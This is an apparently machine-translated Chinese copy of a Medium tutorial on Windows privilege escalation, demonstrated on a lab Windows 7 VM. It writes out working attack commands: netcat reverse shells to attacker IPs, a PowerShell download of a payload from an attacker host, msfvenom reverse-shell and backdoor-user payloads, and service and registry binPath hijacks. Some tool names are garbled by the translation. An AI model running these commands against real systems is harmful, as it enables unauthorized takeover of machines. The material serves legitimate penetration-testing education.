<html>
<head>
<title>Privilege Escalation in Windows</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Windows中的权限提升</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842?source=collection_archive---------0-----------------------#2020-04-18">https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842?source=collection_archive---------0-----------------------#2020-04-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="9036" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">条条大路通系统</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/c29da714a61c8e6e3179ff21fc0c32bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8_rCC2inWBdHdChVUgXm3w.jpeg"/></div></div></figure><p id="639f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">权限提升一开始可能会令人望而生畏，但是一旦您知道要寻找什么和要忽略什么，它就会变得容易。权限提升总是归结于正确的枚举。本指南将主要关注常见的权限提升技术并利用它们。</p><p id="4436" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">本教程的起点是一个盒子上的非特权外壳。出于演示的目的，我使用<code class="fe ln lo lp lq b">netcat</code>从Windows 7 x86虚拟机获得了一个反向shell。</p><h1 id="1d7a" class="lr ls iq bd lt lu lv lw lx ly lz ma mb jw mc jx md jz me ka mf kc mg kd mh mi bi translated">列举</h1><p id="567f" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">我再怎么强调枚举的重要性也不为过。有很多小抄可以从系统中提取有价值的信息。在本指南中，我将重点介绍可用的脚本以及如何使用它们。一些流行的可用脚本有:</p><ol class=""><li id="0764" class="mo mp iq kt b ku kv kx ky la mq le mr li ms lm mt mu mv mw bi translated">卡洛斯·波洛普创作的《温豆豆》</li><li id="8500" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated"><a class="ae mx" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" rel="noopener ugc nofollow" target="_blank">通过harmj0y上电</a></li><li id="037a" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated"><a class="ae mx" href="https://github.com/rasta-mouse/Watson" rel="noopener ugc nofollow" target="_blank">沃森</a>由拉斯塔鼠</li><li id="24f1" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated"><a class="ae mx" href="https://github.com/GhostPack/Seatbelt" rel="noopener ugc nofollow" target="_blank">安全带</a></li><li id="d0b8" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated"><a class="ae mx" href="https://github.com/M4ximuss/Powerless" rel="noopener ugc nofollow" target="_blank">无能为力</a></li><li id="39a3" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated"><a class="ae mx" href="https://github.com/411Hall/JAWS" rel="noopener ugc nofollow" target="_blank">钳口</a></li></ol><p id="447d" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">以我的经验来看，winPEAS和PowerUp是最有用的工具。PowerUp是用PowerShell写的，winPEAS是用C#写的。你需要。NET Framework 4.0来运行winPEAS。还有一个. bat版本的winPEAS，如果。不存在网络支持。就我而言。默认情况下，Windows 7上没有安装NET 4.0，所以我必须安装它才能使用winPEAS。为了安全起见，总是为枚举运行多个脚本。例如，winPEAS检测到了弱注册表漏洞，但PowerUp没有检测到。</p><h1 id="b4e4" class="lr ls iq bd lt lu lv lw lx ly lz ma mb jw mc jx md jz me ka mf kc mg kd mh mi bi translated">特权提升技术</h1><h2 id="0c4a" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">存储的凭据</h2><p id="2523" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">在注册表中搜索用户名和密码。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi np"><img src="../Images/1c07556f8db03cefd15480d4adb7f2ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6HTV7UxgCKwNBUKjQntQ0w.png"/></div></div></figure><p id="07d3" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">既然你已经找到了密码，你会用它做什么呢？如果RDP是可访问的，并且用户在<code class="fe ln lo lp lq b">Remote Desktop Users</code>组中，那就太好了。否则，您可以使用下面的PowerShell脚本以该用户的身份运行命令。</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="fbdf" class="nd ls iq lq b gy nu nv l nw nx">$secpasswd = ConvertTo-SecureString "password321" -AsPlainText -Force<br/>$mycreds = New-Object System.Management.Automation.PSCredential ("john", $secpasswd)<br/>$computer = "GHOST"<br/>[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","192.168.0.114 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)</span></pre><p id="9a85" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">如果<code class="fe ln lo lp lq b">cmdkey /list</code>返回条目，这意味着你可以以某个用户的身份运行，这个用户在windows中存储了他的凭证。</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="a699" class="nd ls iq lq b gy nu nv l nw nx">runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"</span></pre><h2 id="8cd9" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">Windows内核开发</h2><p id="e554" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">如果操作系统定期更新，那么这些漏洞不会有太大的帮助。您可以使用Watson来检查由于缺少补丁而导致的漏洞。沃森已经和winPEAS整合了。如果你发现任何漏洞，你可以从下面的库下载。确保为您的目标下载正确的架构。如果你需要编译二进制文件，你可以使用Kali进行交叉编译。</p><p id="2cc0" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><a class="ae mx" href="https://github.com/SecWiki/windows-kernel-exploits" rel="noopener ugc nofollow" target="_blank">https://github.com/SecWiki/windows-kernel-exploits</a></p><h2 id="937e" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">DLL劫持</h2><p id="7466" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">windows程序在启动时会寻找dll。如果这些DLL不存在，则有可能通过在应用程序寻找的位置放置恶意DLL来提升权限。</p><p id="b5e3" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">通常，Windows应用程序会使用预定义的搜索路径来查找DLL，并且会以特定的顺序检查这些路径。</p><p id="3dad" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">1.应用程序加载的目录<br/> 2。32位系统目录(C:\Windows\System32) <br/> 3。16位系统目录(C:\Windows\System) <br/> 4。Windows目录(C:\Windows) <br/> 5。当前工作目录(CWD) <br/> 6。PATH环境变量中的目录(首先是系统，然后是用户)</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/2f3380ec7acddfc00fda341d5c45ab09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*_BXH1Via6L41eMidTvXRdQ.png"/></div></figure><p id="e43f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">如您所见，PowerUp检测到了一个潜在的DLL劫持漏洞。通常我们是利用PowerUp的<code class="fe ln lo lp lq b">Write-HijackDll</code>函数编写恶意DLL，重启程序。当程序启动时，它加载恶意的DLL并以更高的权限执行我们的代码。</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="0ae4" class="nd ls iq lq b gy nu nv l nw nx">Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'</span></pre><p id="a763" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">在这种情况下，快速的谷歌搜索揭示了可用于利用该漏洞的<a class="ae mx" href="https://github.com/itm4n/Ikeext-Privesc" rel="noopener ugc nofollow" target="_blank">https://github.com/itm4n/Ikeext-Privesc</a>。</p><p id="f021" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">但是，您可以手动执行此操作，以了解整个利用过程。可以参考我的帖子<a class="ae mx" href="https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5" rel="noopener">这里</a>。</p><h2 id="c462" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">未引用的服务路径</h2><p id="ad72" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">当服务启动时，Windows将搜索要执行的二进制文件。要执行的二进制文件的位置在<code class="fe ln lo lp lq b">binPath</code>属性中声明。如果二进制文件的路径没有加引号，则Windows不知道二进制文件的位置，并将在所有文件夹中搜索，从路径的开头开始。</p><p id="6f3f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">因此，如果我们想利用这种错误配置，必须满足三个条件:</p><ul class=""><li id="6a56" class="mo mp iq kt b ku kv kx ky la mq le mr li ms lm nz mu mv mw bi translated">服务路径未加引号；</li><li id="2da5" class="mo mp iq kt b ku my kx mz la na le nb li nc lm nz mu mv mw bi translated">服务路径包含空格；和</li><li id="903a" class="mo mp iq kt b ku my kx mz la na le nb li nc lm nz mu mv mw bi translated">我们在其中一个中间文件夹中拥有写权限。</li></ul><p id="510c" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">如果<code class="fe ln lo lp lq b">binPath</code>设置为</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="313b" class="nd ls iq lq b gy nu nv l nw nx">C:\Program Files\Unquoted Path Service\Common Files\service.exe</span></pre><p id="6d2e" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">Windows将按此顺序搜索:</p><ol class=""><li id="0e9d" class="mo mp iq kt b ku kv kx ky la mq le mr li ms lm mt mu mv mw bi translated">C:\Program.exe</li><li id="17eb" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated">C:\Program Files\Unquoted.exe</li><li id="2846" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated">c:\ Program Files \未引用的Path.exe</li><li id="106d" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated">c:\ Program Files \未加引号的路径服务\Common.exe</li><li id="70b3" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated">c:\ Program Files \ un quoted Path Service \ Common Files \ Service . exe</li></ol><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oa"><img src="../Images/5aa9c581c58aa4d8565b50cb740c96ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JXVUdiG2bxnVTQrfOBTu4Q.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">通电检测到未引用的服务路径</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi of"><img src="../Images/7ace1156a97dddd6fdf95bb03806aeec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*30PKDivO2pfHru2iXC3leg.png"/></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">winPEAS检测到可写路径</figcaption></figure><p id="8d0c" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">用<code class="fe ln lo lp lq b">msfvenom</code>创建一个有效载荷，并将其命名为control.exe。将其放在<code class="fe ln lo lp lq b">C:\Program Files\Unquoted Path Service\common.exe</code>目录中。</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="fbfc" class="nd ls iq lq b gy nu nv l nw nx">powershell -nop -exec bypass -c "(New-Object Net.WebClient).DownloadFile('<a class="ae mx" href="http://192.168.0.114:8080/common.exe'" rel="noopener ugc nofollow" target="_blank">http://192.168.0.114:8080/common.exe'</a>, 'C:\Program Files\Unquoted Path Service\common.exe')"</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi og"><img src="../Images/0f30ed312642592db381c62a9793bdcc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LgUrHSEy5HcNjSlJaLqHig.png"/></div></div></figure><p id="77a3" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">通过使用<code class="fe ln lo lp lq b">sc start unquotedsvc</code>启动服务来执行有效负载</p><h2 id="388c" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">弱文件夹权限</h2><p id="b9c0" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">如果用户对服务使用的文件夹有写权限，他可以用恶意的二进制文件替换它。当服务重新启动时，恶意二进制文件将以更高的权限执行。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/0384ff8e30915275d2878b90b63d4a65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*7NF8JFYj-YzYEfFD2x-H_A.png"/></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">具有弱权限的服务二进制文件</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oi"><img src="../Images/da8d290f9682a410024840808182aa03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U6v8dtbxeZ5pOiqV1chdbw.png"/></div></div></figure><p id="77a1" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">通过将有效负载复制到服务二进制位置来替换文件。重新启动服务，以更高的权限执行有效负载。</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="19cf" class="nd ls iq lq b gy nu nv l nw nx">copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"</span><span id="53d9" class="nd ls iq lq b gy oj nv l nw nx">sc start filepermsvc</span></pre><h2 id="5c3d" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">弱服务权限</h2><p id="121d" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">由具有弱权限的系统创建的服务可能会导致权限提升。如果低权限用户可以修改服务配置，例如将<code class="fe ln lo lp lq b">binPath</code>更改为恶意二进制文件并重新启动服务，那么恶意二进制文件将以系统权限执行。</p><p id="8c9b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">如果“认证用户”组在服务中有<strong class="kt ir"> SERVICE_ALL_ACCESS </strong>，那么它可以修改服务正在执行的二进制文件。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/a8b57e0f1f403bfd590f94760826d684.png" data-original-src="https://miro.medium.com/v2/resize:fit:1178/format:webp/1*fSysETFs5-I2ZFmEghiz0A.png"/></div></figure><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="a464" class="nd ls iq lq b gy nu nv l nw nx">msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service &gt; shell.exe</span></pre><p id="94c0" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">当Windows调用启动服务时，它调用ServiceMain函数并期望从该调用中返回。如果你不指定exe-service，生成的有效负载将不能给你一个持久的外壳。</p><p id="0f53" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">使用修改配置，并启动服务以执行有效负载。</p><p id="dbff" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><code class="fe ln lo lp lq b">sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ol"><img src="../Images/6ab1bf50f74dbe805dd1ca957e1b0eb4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E85BnyPd47bDGs7626Kzqw.png"/></div></div></figure><h2 id="ca97" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">弱注册表权限</h2><p id="9da4" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">在Windows中，服务有一个注册表项，这些注册表项位于:<code class="fe ln lo lp lq b">HKLM\SYSTEM\CurrentControlSet\Services\&lt;service_name&gt;</code></p><p id="286e" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">如果<strong class="kt ir">认证用户</strong>或<strong class="kt ir">NT AUTHORITY \ INTERACTIVE</strong>拥有任何服务的完全控制权，在这种情况下，您可以更改服务将要执行的二进制文件。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/c12d3b901006732068c5a341a25e2866.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qOm4e9DzFyuDW3I7tVUlXA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi on"><img src="../Images/b741abf3f960bd679a661af9a7afa5cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YqEnuS9ENJb0a7FsKiVehw.png"/></div></div></figure><p id="4f6c" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">将注册表的<code class="fe ln lo lp lq b">ImagePath</code>键修改为您的有效负载路径，并重新启动服务。</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="bba4" class="nd ls iq lq b gy nu nv l nw nx">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f</span><span id="bf09" class="nd ls iq lq b gy oj nv l nw nx">sc start regsvc</span></pre><h2 id="f9ff" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">始终安装高架</h2><p id="f119" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">Windows可以通过AlwaysInstallElevated组策略允许低权限用户使用系统权限安装Microsoft Windows Installer包(MSI)。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oo"><img src="../Images/0d5cf7c5b3f1d66ca2530858f340608c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NRsKNG2G0-q0NHhjKfq6Ww.png"/></div></div></figure><p id="336f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">以<code class="fe ln lo lp lq b">msi</code>格式生成<code class="fe ln lo lp lq b">msfvenom </code>有效载荷。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi op"><img src="../Images/6be38237edf7ff6a5d06079e93c88c65.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LayC39op45amUIo0wdKHVg.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated"><code class="fe ln lo lp lq b">msfvenom -p windows/adduser USER=backdoor PASS=Pass@1234 -f msi -o setup.msi</code></figcaption></figure><p id="e846" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">使用以下工具安装有效负载</p><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="af2e" class="nd ls iq lq b gy nu nv l nw nx">msiexec /quiet /qn /i C:\Windows\Temp\setup.msi</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oq"><img src="../Images/f4d7aacfe3d94fe589a645199a26e330.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T5ozZt0p-cIKouFmxCL01g.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">安装MSI后添加的后门用户</figcaption></figure><h2 id="48b2" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">可修改的自动运行</h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi or"><img src="../Images/023d0b880d63ab201021258e2df57692.png" data-original-src="https://miro.medium.com/v2/resize:fit:1362/format:webp/1*bu4wencN-2BwpoAj7RbiDA.png"/></div></div></figure><p id="1121" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">因为可以修改自动运行的路径，所以我们用我们的有效负载替换这个文件。要以提升的权限执行它，我们需要等待管理组中的某个人登录。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi os"><img src="../Images/26dbb1ad7f2794ec1822b9d95e7fbc94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r0DVd9rBda0bSwTfAOIeWQ.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ot"><img src="../Images/2ff849668fd4f16f40de12972e26c141.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4kV9SpW0CUghSrsPWisV1Q.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">管理员登录</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ou"><img src="../Images/f202359333ff7335b3118f660be4ad21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xuBqlHwuxOdM9ouGODk0ww.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">管理员登录后立即执行有效负载。</figcaption></figure><h2 id="e2fb" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">马铃薯/烫手山芋🔥</h2><p id="9851" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">烫手山芋(又名:土豆)利用Windows中的已知问题来获取默认配置中的本地权限提升，即NTLM中继(特别是HTTP-&gt;SMB中继)和NBNS欺骗</p><p id="b75b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">你可以在这里阅读更多关于这个漏洞的信息。</p><p id="11ce" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们增加了很多用户。让我们用管理员权限删除其中一个。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ov"><img src="../Images/4f9b0bac3cd8fa36b5b7c7fa75639434.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GgPZw34oGf6en1xFvaBuEQ.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">管理组内部的后门用户</figcaption></figure><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="5344" class="nd ls iq lq b gy nu nv l nw nx">powershell -exec Bypass -c ". .\Tater.ps1;Invoke-Tater -Trigger 1 -Command 'net localgroup administrators backdoor /delete';"</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ow"><img src="../Images/2e08b991e1d8bd3b2bf33af46b899f9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XK6cNZebJBhpkJpmUJ_vKg.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">漏洞利用完成后，后门用户被删除。</figcaption></figure><h2 id="c27c" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">令牌操作</h2><p id="7567" class="pw-post-body-paragraph kr ks iq kt b ku mj jr kw kx mk ju kz la ml lc ld le mm lg lh li mn lk ll lm ij bi translated">在渗透测试项目中，渗透测试人员经常设法危及Apache、IIS、SQL、MySQL等服务的安全。遗憾的是，此服务不是作为本地系统或高特权帐户运行，而是作为网络服务运行。您可以利用以下漏洞提升权限。</p><ol class=""><li id="2487" class="mo mp iq kt b ku kv kx ky la mq le mr li ms lm mt mu mv mw bi translated"><a class="ae mx" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" rel="noopener ugc nofollow" target="_blank">烂土豆</a></li><li id="2eff" class="mo mp iq kt b ku my kx mz la na le nb li nc lm mt mu mv mw bi translated"><a class="ae mx" href="https://github.com/ohpe/juicy-potato/releases" rel="noopener ugc nofollow" target="_blank">多汁的土豆</a></li></ol><h2 id="1733" class="nd ls iq bd lt ne nf dn lx ng nh dp mb la ni nj md le nk nl mf li nm nn mh no bi translated">懒人赋😜</h2><pre class="kg kh ki kj gt nq lq nr ns aw nt bi"><span id="49a5" class="nd ls iq lq b gy nu nv l nw nx">meterpreter&gt; getsystem</span></pre></div><div class="ab cl ox oy hu oz" role="separator"><span class="pa bw bk pb pc pd"/><span class="pa bw bk pb pc pd"/><span class="pa bw bk pb pc"/></div><div class="ij ik il im in"><p id="2c7a" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><em class="pe">关注</em> <a class="ae mx" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="pe"> Infosec报道</em> </a> <em class="pe">获取更多此类精彩报道。</em></p><div class="pf pg gp gr ph pi"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="pj ab fo"><div class="pk ab pl cl cj pm"><h2 class="bd ir gy z fp pn fr fs po fu fw ip bi translated">信息安全报道</h2><div class="pp l"><h3 class="bd b gy z fp pn fr fs po fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="pq l"><p class="bd b dl z fp pn fr fs po fu fw dk translated">medium.com</p></div></div><div class="pr l"><div class="ps l pt pu pv pr pw kp pi"/></div></div></a></div></div></div>    
</body>
</html>